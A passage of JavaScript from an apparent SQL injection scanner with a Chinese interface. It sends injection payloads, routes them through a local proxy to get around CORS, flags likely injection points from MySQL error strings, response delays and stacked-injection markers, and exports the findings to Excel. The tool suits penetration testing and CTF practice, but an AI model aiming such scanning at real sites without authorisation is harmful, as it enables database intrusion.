    const postData = new URLSearchParams(originalPostData || '');
    const encodedPayload = spaceEncodingStrategies[spaceReplacement](payload);
    postData.set(paramKey, encodedPayload);
    
    return postData.toString();
}

// 发送HTTP请求，通过本地代理服务器绕过CORS限制，支持多种空格编码方式和请求方法
async function sendRequest(url, timeout, method = 'GET', postData = null, spaceReplacement = ['none']) {
    // 对于GET请求，URL已经在buildTestUrl中处理过空格替代，直接使用
    // 对于POST请求，postData已经在buildPostData中处理过空格替代，直接使用
    
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), timeout * 1000);
    
    try {
        // 构建请求选项
        const requestOptions = {
            method: method,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            },
            signal: controller.signal,
            mode: 'cors', // 使用cors模式，允许跨域请求
            credentials: 'omit' // 不发送credentials，避免CORS策略冲突
        };
        
        // 如果是POST请求，添加请求体
        if (method === 'POST' && postData) {
            requestOptions.headers['Content-Type'] = 'application/x-www-form-urlencoded';
            requestOptions.body = postData;
        }
        
        let response;
        if (proxyStatus) {
            // 如果代理服务器运行正常，使用代理服务器
            const proxyUrl = `http://localhost:3001/proxy?url=${encodeURIComponent(url)}`;
            response = await fetch(proxyUrl, requestOptions);
        } else {
            // 否则直接发送请求
            response = await fetch(url, requestOptions);
        }
        
        clearTimeout(id);
        
        // 如果请求成功，返回结果
        return {
            status: response.status,
            statusText: response.statusText,
            headers: response.headers,
            body: await response.text(),
            ok: response.ok
        };
    } catch (error) {
        clearTimeout(id);
        // 抛出错误
        throw error;
    }
}

// 分析响应
function analyzeResponse(testItem, response, responseTime, error = null) {
    if (!response) {
        let errorMessage = '请求失败';
        let riskLevel = 'low';
        if (error) {
            if (error.message.includes('CORS')) {
                errorMessage = error.message+'：CORS跨域限制，无法直接测试。请使用\"仅生成注入语法\"功能，复制URL到浏览器中访问或安装CORS扩展。';
                riskLevel = 'medium';
            } else if (error.message.includes('ERR_CONNECTION_RESET')) {
                errorMessage = error.message+'：连接被重置，可能存在WAF防护，阻止了SQL注入';
                riskLevel = 'medium';
            } else if (error.message.includes('Failed to fetch')) {
                errorMessage = error.message+'：网络请求失败，可能存在WAF防护，阻止了SQL注入';
                riskLevel = 'medium';
            } else {
                errorMessage = `请求错误: ${error.message}`;
                riskLevel = 'low';
            }
        }
        return {
            status: 'error',
            message: errorMessage,
            riskLevel: riskLevel
        };
    }
    
    // 初始化结果
    let result = {
        status: 'negative',
        message: '未检测到注入点',
        riskLevel: 'low'
    };
    

    
    // 检查状态码
    if (response.status === 500) {
        // 检查是否是代理服务器返回的错误响应
        try {
            const proxyError = JSON.parse(response.body);
            if (proxyError.error) {
                // 是代理服务器错误，标记为测试错误
                result.status = 'error';
                result.message = `代理服务器错误: ${proxyError.error}${proxyError.details ? ` (${proxyError.details})` : ''}`;
                result.riskLevel = 'low';
            } else {
                // 是目标服务器返回的500错误，可能存在注入点
                result.status = 'positive';
                result.message = '服务器返回500错误，可能存在注入点';
                result.riskLevel = 'high';
            }
        } catch (e) {
            // 不是JSON格式，可能是目标服务器返回的500错误页面
            result.status = 'positive';
            result.message = '服务器返回500错误，可能存在注入点';
            result.riskLevel = 'high';
        }
    }
    
    // 检查响应时间（针对时间盲注）
    if (testItem.testCase.name.includes('时间盲注') && responseTime > testItem.config.timeout * 1000 * 0.8) {
        result.status = 'positive';
        result.message = '响应时间明显增加，可能存在时间盲注';
        result.riskLevel = 'high';
    }
    
    // 检查是否包含SQL错误信息
    const sqlErrorPatterns = [
        'SQL syntax',
        'mysql_fetch',
        'mysqli_fetch',
        'PDOException',
        'You have an error in your SQL syntax',
        'warning: mysql',
        'Fatal error: Uncaught mysqli_sql_exception',
        'supplied argument is not a valid MySQL result',
        'Invalid query',
        'Database error'
    ];
    
    // 检查堆叠注入成功的特征
    const stackSuccessPatterns = [
        'array(',
        'ctftraining',
        'information_schema',
        'mysql',
        'performance_schema',
        'supersqli',
        'test',
        'show databases',
        'show tables'
    ];
    
    const lowerBody = response.body.toLowerCase();
    
    // 检查SQL错误
    let sqlErrorFound = false;
    for (const pattern of sqlErrorPatterns) {
        if (lowerBody.includes(pattern.toLowerCase())) {
            result.status = 'positive';
            result.message = `检测到SQL错误信息: ${pattern}`;
            result.riskLevel = 'high';
            sqlErrorFound = true;
            break;
        }
    }
    
    // ORDER BY字段数测试已移除，只保留注入点检测功能
    
    // 检查堆叠注入成功特征
    if (result.status === 'negative') {
        for (const pattern of stackSuccessPatterns) {
            if (response.body.includes(pattern)) {
                result.status = 'positive';
                result.message = `检测到堆叠注入成功特征: ${pattern}`;
                result.riskLevel = 'high';
                break;
            }
        }
    }
    
    // 检查页面内容变化
    if (result.status === 'negative') {
        // 检查响应内容长度变化
        if (response.body.length < 100) {
            result.status = 'warning';
            result.message = '页面内容异常简短，可能存在注入点';
            result.riskLevel = 'medium';
        }
        
        // 检查是否返回了异常结果
        if (response.body.includes('array(') || response.body.includes('string(')) {
            result.status = 'positive';
            result.message = '检测到数组格式结果，可能存在注入点';
            result.riskLevel = 'high';
        }
    }
    
    return result;
}

// 添加测试结果
function addTestResult(result) {
    // 计算并保存解码后的URL，供筛选使用
    try {
        const url = new URL(result.testUrl);
        const protocol = url.protocol;
        const host = url.host;
        const pathname = url.pathname;
        
        let decodedQuery = '';
        const params = new URLSearchParams(url.search);
        let paramIndex = 0;
        
        for (const [key, value] of params.entries()) {
            let decodedKey = key;
            let decodedValue = value;
            
            try {
                decodedKey = customUrlDecode(key);
                decodedValue = customUrlDecode(value);
            } catch (e) {
            }
            
            if (paramIndex > 0) {
                decodedQuery += '&';
            }
            decodedQuery += `${decodedKey}=${decodedValue}`;
            paramIndex++;
        }
        
        result.decodedUrl = `${protocol}//${host}${pathname}${decodedQuery ? '?' + decodedQuery : ''}`;
    } catch (e) {
        result.decodedUrl = result.testUrl;
    }
    
    // 更新结果计数
    if (result.result.status === 'positive') {
        positiveResults++;
    } else if (result.result.status === 'warning') {
        warningResults++;
    } else if (result.result.status === 'error') {
        errorResults++;
    }
    
    updateTestStats();
    
    // 将结果添加到列表
    testResults.push(result);
    
    // 对于正在进行的测试，直接添加新结果到表格，避免重新渲染整个表格导致闪烁
    if (isTesting) {
        // 显示空结果提示
        const emptyResults = document.getElementById('emptyResults');
        emptyResults.style.display = 'none';
        
        // 如果当前是第一页且结果数量未超过当前页容量，直接添加结果
        const currentPage = 1; // 测试过程中始终显示第一页
        const currentPageSize = parseInt(document.getElementById('pageSizeSelect').value);
        
        // 只在结果数量未超过当前页容量时添加到表格
        if (testResults.length <= currentPageSize) {
            displayTestResult(result, testResults.length - 1);
        }
    } else {
        // 测试已完成，重新计算分页并显示结果
        updateResultsDisplay();
    }
}

// 更新结果显示，包含分页和过滤
function updateResultsDisplay() {
    const tableBody = document.getElementById('resultsTableBody');
    const emptyResults = document.getElementById('emptyResults');
    
    // 清空表格内容
    tableBody.innerHTML = '';
    
    // 应用过滤
    applyFilters();
    
    // 计算分页
    paginateResults();
    
    // 更新分页信息
    updatePageInfo();
    
    // 更新分页按钮状态
    updatePaginationButtons();
    
    // 显示当前页的结果
    if (paginatedResults.length > 0) {
        emptyResults.style.display = 'none';
        paginatedResults.forEach((result, index) => {
            displayTestResult(result, testResults.indexOf(result));
        });
    } else {
        emptyResults.style.display = 'block';
    }
}

// 应用过滤 - 根据筛选状态过滤测试结果
function applyFilters() {
    // 初始化筛选结果为所有测试结果
    filteredResults = testResults;
    
    // 如果没有筛选条件，直接返回所有结果
    if (!window.filterState) {
        return;
    }
    
    // 风险等级中文到英文的映射
    const riskLevelMap = {
        '高风险': 'high',
        '中风险': 'medium',
        '低风险': 'low'
    };
    
    // 结果状态中文到英文的映射
    const resultStatusMap = {
        '注入点发现': 'positive',
        '可疑注入点': 'warning',
        '无注入点': 'negative',
        '测试错误': 'error'
    };
    
    // 应用所有筛选条件
    filteredResults = filteredResults.filter(result => {
        // 检查结果是否匹配所有筛选条件
        for (const [columnIndexStr, filterValue] of Object.entries(window.filterState)) {
            const columnIndex = parseInt(columnIndexStr);
            // 跳过空筛选值
            if (!filterValue) {
                continue;
            }
            
            // 获取筛选值的实际匹配值（处理中文到英文的映射）
            let actualFilterValue = filterValue;
            
            // 特殊处理风险等级
            if (columnIndex === 20 && riskLevelMap[filterValue]) {
                actualFilterValue = riskLevelMap[filterValue];
            }
            
            // 特殊处理结果类型
            if (columnIndex === 19 && resultStatusMap[filterValue]) {
                actualFilterValue = resultStatusMap[filterValue];
            }
            
            // 获取结果中对应列的值
            let cellValue = '';
            
            // 注意：测试结果的属性结构是嵌套的，部分属性在result对象中，部分在result.result对象中
            switch(columnIndex) {
                case 0: // 序号
                    cellValue = (result.index || 0).toString();
                    break;
                case 1: // 测试URL
                    cellValue = result.testUrl || '';
                    break;
                case 2: // URL解码
                    cellValue = result.decodedUrl || '';
                    break;
                case 3: // 请求主体
                    cellValue = result.postData || '';
                    break;
                case 4: // 注入原型
                    cellValue = result.testCase?.name || '';
                    break;
                case 5: // 参数
                    cellValue = result.param?.key || '';
                    break;
                case 6: // 注释变体
                    cellValue = result.testCase?.commentVariant || '';
                    break;
                case 7: // 空格替代
                    cellValue = result.testCase?.spaceReplacement || '';
                    break;
                case 8: // 字段包裹符
                    cellValue = result.testCase?.wrapperType || '';
                    break;
                case 9: // 逻辑运算符
                    cellValue = result.testCase?.logicOperator || '';
                    break;
                case 10: // 时间盲注
                    cellValue = result.testCase?.blindTechnique || '';
                    break;
                case 11: // 状态码
                    cellValue = result.statusCode ? result.statusCode.toString() : '';
                    break;
                case 12: // 响应时间(1=1)
                    cellValue = result.responseTime ? result.responseTime.toString() : '';
                    break;
                case 13: // 响应时间(1=2)
                    cellValue = result.falseResponseTime ? result.falseResponseTime.toString() : '';
                    break;
                case 14: // Content-Length
                    cellValue = result.contentLength ? result.contentLength.toString() : '';
                    break;
                case 15: // 响应体预览(1=1)
                    {
                        let fullResponseBody = 'N/A';
                        if (result.result && result.result.status === 'error') {
                            fullResponseBody = result.result.message;
                        } else if (result.response && result.response.body) {
                            let cleanedBody = result.response.body.replace(/<[^>]*>/g, '');
                            cleanedBody = cleanedBody.replace(/\s+/g, ' ').trim();
                            fullResponseBody = cleanedBody;
                            if (!fullResponseBody || fullResponseBody === '') {
                                fullResponseBody = '空响应体';
                            }
                        }
                        cellValue = fullResponseBody;
                    }
                    break;
                case 16: // 响应体预览(1=2)
                    {
                        let falseFullResponseBody = 'N/A';
                        if (result.falseResult) {
                            if (result.falseResult.status === 'error') {
                                falseFullResponseBody = result.falseResult.message;
                            } else if (result.falseResponse && result.falseResponse.body) {
                                let cleanedBody = result.falseResponse.body.replace(/<[^>]*>/g, '');
                                cleanedBody = cleanedBody.replace(/\s+/g, ' ').trim();
                                falseFullResponseBody = cleanedBody;
                                if (!falseFullResponseBody || falseFullResponseBody === '') {
                                    falseFullResponseBody = '空响应体';
                                }
                            } else if (result.falseResponse) {
                                falseFullResponseBody = '空响应体';
                            } else {
                                falseFullResponseBody = '测试未执行';
                            }
                        } else if (result.falseResponse) {
                            if (result.falseResponse.body) {
                                let cleanedBody = result.falseResponse.body.replace(/<[^>]*>/g, '');
                                cleanedBody = cleanedBody.replace(/\s+/g, ' ').trim();
                                falseFullResponseBody = cleanedBody;
                                if (!falseFullResponseBody || falseFullResponseBody === '') {
                                    falseFullResponseBody = '空响应体';
                                }
                            } else {
                                falseFullResponseBody = '空响应体';
                            }
                        } else {
                            falseFullResponseBody = '测试未执行';
                        }
                        cellValue = falseFullResponseBody;
                    }
                    break;
                case 17: // 1=1和1=2长度是否一致
                    const lengthsMatch = result.lengthsMatch === true;
                    cellValue = lengthsMatch ? '是' : '否';
                    break;
                case 18: // 1=1和1=2内容是否一致
                    const contentsMatch = result.contentsMatch === true;
                    cellValue = contentsMatch ? '是' : '否';
                    break;
                case 19: // 结果类型
                    cellValue = result.result?.status || '';
                    break;
                case 20: // 风险等级
                    cellValue = result.result?.riskLevel || '';
                    break;
                default:
                    cellValue = '';
            }
            
            // 检查是否匹配筛选条件
            const cellText = cellValue.toLowerCase().trim();
            
            // 处理筛选条件（可能是数组或单个值）
            let filterValues = [];
            if (Array.isArray(actualFilterValue)) {
                filterValues = actualFilterValue;
            } else {
                filterValues = [actualFilterValue];
            }
            
            // 特殊处理第17列和第18列（布尔值列）- 精确匹配
            if (columnIndex === 17 || columnIndex === 18) {
                // 将筛选值 "true"/"false" 映射为表格显示的 "是"/"否"
                const normalizedFilterValues = filterValues.map(v => {
                    const lowerV = v.toLowerCase().trim();
                    if (lowerV === 'true') return '是';
                    if (lowerV === 'false') return '否';
                    return lowerV;
                });
                if (!normalizedFilterValues.includes(cellText)) {
                    return false;
                }
            } else {
                // 其他列使用包含匹配
                const matched = filterValues.some(filterValue => {
                    const filterText = filterValue.toLowerCase().trim();
                    return cellText.includes(filterText);
                });
                
                if (!matched) {
                    return false;
                }
            }
        }
        
        // 匹配所有筛选条件
        return true;
    });
}

// 计算分页
function paginateResults() {
    if (pageSize === 'all' || pageSize === undefined) {
        paginatedResults = filteredResults;
    } else {
        const startIndex = (currentPage - 1) * parseInt(pageSize);
        const endIndex = startIndex + parseInt(pageSize);
        paginatedResults = filteredResults.slice(startIndex, endIndex);
    }
}

// 更新分页信息
function updatePageInfo() {
    const pageCount = pageSize === 'all' || pageSize === undefined ? 1 : Math.ceil(filteredResults.length / parseInt(pageSize));
    document.getElementById('pageInfo').innerHTML = `第 <strong>${currentPage}</strong> 页，共 <strong>${pageCount}</strong> 页`;
}

// 更新分页按钮状态
function updatePaginationButtons() {
    const prevBtn = document.getElementById('prevPageBtn');
    const nextBtn = document.getElementById('nextPageBtn');
    const pageCount = pageSize === 'all' || pageSize === undefined ? 1 : Math.ceil(filteredResults.length / parseInt(pageSize));
    
    prevBtn.disabled = currentPage === 1;
    nextBtn.disabled = currentPage >= pageCount;
}

// 处理页码大小变化
function handlePageSizeChange() {
    pageSize = document.getElementById('pageSizeSelect').value;
    currentPage = 1;
    updateResultsDisplay();
}

// 处理上一页
function handlePrevPage() {
    if (currentPage > 1) {
        currentPage--;
        updateResultsDisplay();
    }
}

// 处理下一页
function handleNextPage() {
    const pageCount = pageSize === 'all' || pageSize === undefined ? 1 : Math.ceil(filteredResults.length / parseInt(pageSize));
    if (currentPage < pageCount) {
        currentPage++;
        updateResultsDisplay();
    }
}

// 过滤结果
function filterResults() {
    updateResultsDisplay();
}

// 导出Excel功能
function exportExcel() {
    // 确保当前有测试结果
    if (testResults.length === 0) {
        showToast('没有测试结果可以导出！', 'warning');
        return;
    }
    
    // 应用当前的过滤条件，确保只导出筛选后的结果
    applyFilters();
    
    // 确保有筛选后的结果
    if (filteredResults.length === 0) {
        showToast('当前筛选条件下没有测试结果可以导出！', 'warning');
        return;
    }
    
    // 准备Excel数据
    const excelData = [];
    
    // 添加表头
    excelData.push([
        '序号',
        '测试URL',
        'URL解码',
        '请求主体',
        '注入原型',
        '参数',
        '注释变体',
        '空格替代',
        '字段包裹符',
        '逻辑运算符',
        '时间盲注',
        '状态码',
        '响应时间(1=1)(ms)',
        '响应时间(1=2)(ms)',
        'Content-Length',
        '响应体预览(1=1)',
        '响应体预览(1=2)',
        '1=1和1=2长度是否一致',
        '1=1和1=2内容是否一致',
        '结果',
        '风险等级'
    ]);
    
    // 遍历筛选后的结果，添加数据行
    filteredResults.forEach((result, index) => {
        // 获取URL解码
        let decodedUrl = result.testUrl;
        try {
            // 解析URL
            const url = new URL(result.testUrl);
            
            // 解码URL的各个部分，然后手动构建完整的解码URL
            const protocol = url.protocol;
            const host = url.host;
            const pathname = url.pathname;
            
            // 解码查询参数部分
            let decodedQuery = '';
            const params = new URLSearchParams(url.search);
            
            // 逐个解码查询参数
            let paramIndex = 0;
            for (const [key, value] of params.entries()) {
                // 解码键和值，包括%09、%0A和%27等特殊字符
            let decodedKey = key;
            let decodedValue = value;
            
            try {
                // 使用自定义解码函数处理特殊字符
                decodedKey = customUrlDecode(key);
                decodedValue = customUrlDecode(value);
            } catch (e) {
                // 如果解码失败，保留原始值
            }
                
                // 手动构建查询字符串，不需要重新编码，直接使用解码后的值
                if (paramIndex > 0) {
                    decodedQuery += '&';
                }
                decodedQuery += `${decodedKey}=${decodedValue}`;
                paramIndex++;
            }
            
            // 构建完整的解码URL
            decodedUrl = `${protocol}//${host}${pathname}${decodedQuery ? '?' + decodedQuery : ''}`;
        } catch (e) {
            // 如果所有解码尝试都失败，使用原始URL
            decodedUrl = result.testUrl;
        }
        
        // 获取请求主体
        let requestBody = '';
        if (result.config.requestMethod === 'POST') {
            requestBody = result.postData || 'N/A';
        } else {
            try {
                const url = new URL(result.testUrl);
                requestBody = url.search ? url.search.substring(1) : 'N/A';
            } catch (e) {
                // 如果URL解析失败，尝试从原始URL中提取查询字符串
                const queryStartIndex = result.testUrl.indexOf('?');
                requestBody = queryStartIndex !== -1 ? result.testUrl.substring(queryStartIndex + 1) : 'N/A';
            }
        }
        
        // 构建注入原型
        let injectionPrototype = '';
        if (result.config.requestMethod === 'POST') {
            injectionPrototype = `${result.param.key}=${result.testCase.payload}`;
        } else {
            injectionPrototype = `${result.param.key}=${result.testCase.payload}`;
        }
        
        // 注释变体映射
        const commentVariantMap = {
            'no_comment': '不带注释',
            'double_dash': '双横线注释',
            'double_dash_plus': '双横线+注释',
            'hash': '井号注释',
            'multi_line': '多行注释',
            'inline': '内联注释',
            'double_dash_space': '双重注释'
        };
        
        // 空格替代映射
        const spaceReplacementMap = {
            'none': '无（正常空格）',
            'tab': 'Tab制表符',
            'newline': '换行符',
            'comment': '注释空格',
            'plus': '加号连接'
        };
        
        // 时间盲注映射
        const blindTechniqueMap = {
            'time_blind_mysql': '时间盲注MySQL',
            'time_blind_pg': '时间盲注PostgreSQL',
            'time_blind_mssql': '时间盲注SQLServer'
        };
        
        // 结果状态标签
        const statusBadges = {
            'positive': '注入点发现',
            'warning': '可疑注入点',
            'negative': '无注入点',
            'error': '测试错误'
        };
        
        // 风险等级标签
        const riskLabels = {
            'high': '高风险',
            'medium': '中风险',
            'low': '低风险'
        };
        
        // 判断时间盲注
        let blindTechnique = '无';
        if (result.testCase.blindTechnique) {
            blindTechnique = result.testCase.blindTechnique;
        } else if (result.testCase.name.includes('时间盲注MySQL')) {
            blindTechnique = '时间盲注MySQL';
        } else if (result.testCase.name.includes('时间盲注PostgreSQL')) {
            blindTechnique = '时间盲注PostgreSQL';
        } else if (result.testCase.name.includes('时间盲注SQLServer')) {
            blindTechnique = '时间盲注SQLServer';
        } else if (result.testCase.name.includes('time_blind_pg')) {
            blindTechnique = '时间盲注PostgreSQL';
        } else if (result.testCase.name.includes('time_blind_mssql')) {
            blindTechnique = '时间盲注SQLServer';
        } else if (result.testCase.name.includes('time_blind')) {
            blindTechnique = '时间盲注MySQL';
        }
        
        // 确保时间盲注显示为'无'而不是其他默认值
        if (blindTechnique === 'N/A' || blindTechnique === '' || blindTechnique === undefined) {
            blindTechnique = '无';
        }
        
        // 先声明所有变量，避免ReferenceError
        let commentVariant = '不带注释';
        let spaceReplacement = '无（正常空格）';
        let fieldWrapper = '无';
        let logicOperator = '无';
        
    // 1. 首先，根据测试用例的payload识别注释变体
    const payload = result.testCase.payload;
    let detectedCommentVariant = 'no_comment';
    
    if (payload.includes(' -- ')) {
            detectedCommentVariant = 'double_dash';
        } else if (payload.includes(' --+')) {
            detectedCommentVariant = 'double_dash_plus';
        } else if (payload.includes(' #')) {
            detectedCommentVariant = 'hash';
        } else if (payload.includes(' /*')) {
            if (payload.includes('/*!')) {
                detectedCommentVariant = 'inline';
            } else {
                detectedCommentVariant = 'multi_line';
            }
        } else if (payload.includes(' -- -')) {
            detectedCommentVariant = 'double_dash_space';
        }
        
    // 2. 将检测到的注释变体映射为中文
        commentVariant = commentVariantMap[detectedCommentVariant] || '不带注释';
        
        // 3. 如果测试用例本身有commentVariant属性，优先使用
        if (result.testCase.commentVariant) {
            // 检查是否已经是中文名称
            if (Object.values(commentVariantMap).includes(result.testCase.commentVariant)) {
                commentVariant = result.testCase.commentVariant;
            } 
            // 如果是英文键名，映射为中文
            else if (commentVariantMap[result.testCase.commentVariant]) {
                commentVariant = commentVariantMap[result.testCase.commentVariant];
            }
        }
        
        // 4. 处理注释变体测试用例的特殊情况
        if (result.testCase.name.includes('注释变体-')) {
            commentVariant = result.testCase.commentVariant || result.testCase.name.replace('注释变体-', '');
        }
            
        // 统一显示：将"无"和"-"都改为"不带注释"
        if (commentVariant === '无' || commentVariant === '-') {
            commentVariant = '不带注释';
        }
        
        // 获取空格替代类型
        spaceReplacement = result.testCase.spaceReplacement || 'none';
        // 将英文空格替代映射为中文
        spaceReplacement = spaceReplacementMap[spaceReplacement] || spaceReplacement;
        
        // 获取字段包裹符类型
        fieldWrapper = result.testCase.wrapperType || '无';
        if (result.testCase.name.includes('字段包裹符-')) {
            fieldWrapper = result.testCase.wrapperType || result.testCase.name.replace('字段包裹符-', '');
        }
        
        // 获取逻辑运算符
        // 优先使用测试用例对象的logicOperator属性
        if (result.testCase.logicOperator) {
            if (result.testCase.logicOperator === 'none') {
                logicOperator = '无';
            } else {
                // 逻辑运算符内部表示到实际符号的映射
                const operatorMap = {
                    'and': 'AND',
                    'or': 'OR',
                    'and_double_ampersand': '&&',
                    'or_double_pipe': '||',
                    'not_equal': '<>',
                    'like': 'LIKE',
                    'in': 'IN',
                    'regexp': 'REGEXP'
                };
                logicOperator = operatorMap[result.testCase.logicOperator] || result.testCase.logicOperator || '无';
            }
        } else {
            // 从测试用例名称中提取逻辑运算符
            if (result.testCase.name.includes('AND')) {
                logicOperator = 'AND';
            } else if (result.testCase.name.includes('OR')) {
                logicOperator = 'OR';
            } else if (result.testCase.name.includes('&&')) {
                logicOperator = '&&';
            } else if (result.testCase.name.includes('||')) {
                logicOperator = '||';
            } else if (result.testCase.name.includes('不等于')) {
                logicOperator = '<>';
            } else if (result.testCase.name.includes('LIKE')) {
                logicOperator = 'LIKE';
            } else if (result.testCase.name.includes('IN')) {
                logicOperator = 'IN';
            } else if (result.testCase.name.includes('REGEXP')) {
                logicOperator = 'REGEXP';
            } else {
                // 从payload中提取逻辑运算符
                const payload = result.testCase.payload;
                if (payload.includes(' AND ')) {
                    logicOperator = 'AND';
                } else if (payload.includes(' OR ')) {
                    logicOperator = 'OR';
                } else if (payload.includes(' && ')) {
                    logicOperator = '&&';
                } else if (payload.includes(' || ')) {
                    logicOperator = '||';
                } else if (payload.includes(' <> ')) {
                    logicOperator = '<>';
                } else if (payload.includes(' LIKE ')) {
                    logicOperator = 'LIKE';
                } else if (payload.includes(' IN ')) {
                    logicOperator = 'IN';
                } else if (payload.includes(' REGEXP ')) {
                    logicOperator = 'REGEXP';
                } else {
                    logicOperator = '无';
                }
            }
        }
        
        // 获取Content-Length
        let contentLength = 'N/A';
        if (result.response && result.response.headers) {
            contentLength = result.response.headers.get('content-length') || result.response.body.length || 'N/A';
        }
        
        // 生成响应体预览，限制最大长度为1000字符
        let responsePreview = 'N/A';
        if (result.result && result.result.status === 'error') {
            // 如果1=1测试出现错误，显示错误信息
            responsePreview = result.result.message;
        } else if (result.response && result.response.body) {
            // 清理HTML标签，只保留纯文本
            let cleanedBody = result.response.body.replace(/<[^>]*>/g, '');
            // 移除多余的空白字符
            cleanedBody = cleanedBody.replace(/\s+/g, ' ').trim();
            // 限制长度并添加省略号用于显示
            responsePreview = cleanedBody.length > 1000 ? cleanedBody.substring(0, 1000) + '...' : cleanedBody;
            // 如果清理后内容为空，显示提示
            if (!responsePreview || responsePreview === '') {
                responsePreview = '空响应体';
            }
        }
        
        // 生成1=2响应体预览
        let falseResponsePreview = 'N/A';
        if (result.falseResult) {
            if (result.falseResult.status === 'error') {
                // 如果1=2测试出现错误，显示错误信息
                falseResponsePreview = result.falseResult.message;
            } else if (result.falseResponse && result.falseResponse.body) {
                // 清理HTML标签，只保留纯文本
                let cleanedBody = result.falseResponse.body.replace(/<[^>]*>/g, '');
                // 移除多余的空白字符
                cleanedBody = cleanedBody.replace(/\s+/g, ' ').trim();
                // 限制长度并添加省略号用于显示
                falseResponsePreview = cleanedBody.length > 1000 ? cleanedBody.substring(0, 1000) + '...' : cleanedBody;
                // 如果清理后内容为空，显示提示
                if (!falseResponsePreview || falseResponsePreview === '') {
                    falseResponsePreview = '空响应体';
                }
            } else if (result.falseResponse) {
                // 1=2测试执行了，但响应体为空
                falseResponsePreview = '空响应体';
            } else {
                // 1=2测试执行了，但没有响应
                falseResponsePreview = '无响应';
            }
        } else if (result.falseResponse) {
            if (result.falseResponse.body) {
                // 清理HTML标签，只保留纯文本
                let cleanedBody = result.falseResponse.body.replace(/<[^>]*>/g, '');
                // 移除多余的空白字符
                cleanedBody = cleanedBody.replace(/\s+/g, ' ').trim();
                // 限制长度并添加省略号用于显示
                falseResponsePreview = cleanedBody.length > 1000 ? cleanedBody.substring(0, 1000) + '...' : cleanedBody;
                // 如果清理后内容为空，显示提示
                if (!falseResponsePreview || falseResponsePreview === '') {
                    falseResponsePreview = '空响应体';
                }
            } else {
                // 1=2测试执行了，但响应体为空
                falseResponsePreview = '空响应体';
            }
        } else {
            // 1=2测试没有执行，显示测试未执行
            falseResponsePreview = '测试未执行';
        }
        
        // 添加数据行
        excelData.push([
            index + 1,
            result.testUrl,
            decodedUrl,
            requestBody,
            injectionPrototype,
            result.param.key,
            commentVariant,
            spaceReplacement,
            fieldWrapper,
            logicOperator,
            blindTechnique,
            result.response ? result.response.status : 'N/A',
            result.responseTime,
            result.falseResponseTime || 'N/A',
            contentLength,
            responsePreview,
            falseResponsePreview,
            result.lengthsMatch ? '是' : '否',
            result.contentsMatch ? '是' : '否',
            statusBadges[result.result.status] || result.result.status,
            riskLabels[result.result.riskLevel] || result.result.riskLevel
        ]);
    });
    
    // 创建工作簿和工作表
    const workbook = XLSX.utils.book_new();
    const worksheet = XLSX.utils.aoa_to_sheet(excelData);
    
    // 设置列宽自适应
    const wscols = [
        {wch: 8},     // 序号
        {wch: 120},   // 测试URL
        {wch: 120},   // URL解码
        {wch: 80},    // 请求主体
        {wch: 50},    // 注入原型
        {wch: 15},    // 参数
        {wch: 15},    // 注释变体
        {wch: 15},    // 空格替代
        {wch: 15},    // 字段包裹符
        {wch: 15},    // 逻辑运算符
        {wch: 15},    // 时间盲注
        {wch: 10},    // 状态码
        {wch: 15},    // 响应时间(1=1)
        {wch: 15},    // 响应时间(1=2)
        {wch: 15},    // Content-Length
        {wch: 60},    // 响应体预览(1=1)
        {wch: 60},    // 响应体预览(1=2)
        {wch: 25},    // 1=1和1=2长度是否一致
        {wch: 25},    // 1=1和1=2内容是否一致
        {wch: 15},    // 结果
        {wch: 15}     // 风险等级
    ];
    worksheet['!cols'] = wscols;
    
    // 添加工作表到工作簿
    XLSX.utils.book_append_sheet(workbook, worksheet, 'SQL注入测试结果');
    
    // 生成文件名，包含当前日期和时间
    const date = new Date();
    const fileName = `SQL注入测试结果_${date.getFullYear()}${(date.getMonth()+1).toString().padStart(2, '0')}${date.getDate().toString().padStart(2, '0')}_${date.getHours().toString().padStart(2, '0')}${date.getMinutes().toString().padStart(2, '0')}${date.getSeconds().toString().padStart(2, '0')}.xlsx`;
    
    // 导出Excel文件
    XLSX.writeFile(workbook, fileName);
    
    // 显示导出成功提示
    showToast(`成功导出 ${filteredResults.length} 条测试结果到Excel文件！`, 'success');
}

// 显示测试结果
function displayTestResult(result, displayIndex) {
    const tableBody = document.getElementById('resultsTableBody');
    const emptyResults = document.getElementById('emptyResults');
    
    // 隐藏空结果提示
    emptyResults.style.display = 'none';
    
    // 创建结果行
    const row = document.createElement('tr');
    row.className = `fade-in result-row result-${result.result.status}`;
    row.dataset.status = result.result.status;
    row.dataset.risk = result.result.riskLevel;
    

    
    // 结果状态标签
    const statusBadges = {
        'positive': '<span class="badge badge-positive">注入点发现</span>',
        'warning': '<span class="badge badge-warning">可疑注入点</span>',
        'negative': '<span class="badge badge-negative">无注入点</span>',
        'error': '<span class="badge badge-error">测试错误</span>'
    };
    
    // 风险等级标签
    const riskLabels = {
        'high': '<span class="risk-high">高风险</span>',
        'medium': '<span class="risk-medium">中风险</span>',
        'low': '<span class="risk-low">低风险</span>'
    };
    
    // 解码URL，让显示更清晰
    const displayUrl = result.testUrl.replace(/\+/g, ' ');
    
    // 获取Content-Length
    let contentLength = 'N/A';
    if (result.response && result.response.headers) {
        contentLength = result.response.headers.get('content-length') || result.response.body.length || 'N/A';
    }
    
    // 生成响应体预览，限制最大长度为100字符
    let responsePreview = 'N/A';
    let fullResponseBody = 'N/A';
    if (result.result && result.result.status === 'error') {
        // 如果1=1测试出现错误，显示错误信息
        responsePreview = result.result.message;
        fullResponseBody = result.result.message;
    } else if (result.response && result.response.body) {
        // 清理HTML标签，只保留纯文本
        let cleanedBody = result.response.body.replace(/<[^>]*>/g, '');
        // 移除多余的空白字符
        cleanedBody = cleanedBody.replace(/\s+/g, ' ').trim();
        // 保存完整的响应体内容
        fullResponseBody = cleanedBody;
        // 限制长度并添加省略号用于显示
        responsePreview = cleanedBody.length > 100 
            ? cleanedBody.substring(0, 100) + '...' 
            : cleanedBody;
        // 如果清理后内容为空，显示提示
        if (!responsePreview || responsePreview === '') {
            responsePreview = '空响应体';
            fullResponseBody = '空响应体';
        }
    }
    
    // 生成1=2响应体预览
    let falseResponsePreview = 'N/A';
    let falseFullResponseBody = 'N/A';
    if (result.falseResult) {
        if (result.falseResult.status === 'error') {
            // 如果1=2测试出现错误，显示错误信息
            falseResponsePreview = result.falseResult.message;
            falseFullResponseBody = result.falseResult.message;
        } else if (result.falseResponse && result.falseResponse.body) {
